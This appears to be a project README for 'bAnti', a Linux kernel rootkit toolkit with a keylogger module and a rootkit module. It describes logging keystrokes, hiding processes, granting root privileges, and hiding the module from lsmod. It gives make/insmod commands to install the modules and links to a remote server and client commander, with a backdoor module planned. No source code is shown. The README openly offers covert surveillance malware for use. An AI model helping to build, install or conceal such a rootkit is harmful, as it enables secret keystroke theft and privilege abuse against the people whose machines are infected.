bAnti - Kernel Based Root ToolKit
----
banti is is sample kernel based root toolkit for Linux. It contains keylogger and rootkit modules for linux kernel. With those modules, you are able to log keyboard info, hide processes and get root privileges for each process.

#### Compilation
Compilation and installation of this modules, are possible with makefile

```
make
insmod keylog.ko
insmod bantikit.ko
make clean
```
Afther insert, module hides itself from module list by default, so it can not be detected with 'lsmod' command.

#### Remove
If those modules is no longer requires for you, you can just unload from modules
```
rmmod keylog
rmmod bantikit
```

#### Usage
We are currently at development process, usage information will be available soon.
You can see development process below.

#### Development Process
- [x] Remote server [See Here](https://github.com/nikopeikrishvili/proto-banti)
- [x] Client commander [See Here](https://github.com/nikopeikrishvili/proto-banti)
- [x] Kernel based keylogger module
- [x] Main rootkit module 'bantikit'
- [ ] Backdor module
- [ ] Many fucking things

![alt tag](http://off-sec.com/ftp/bow.png)
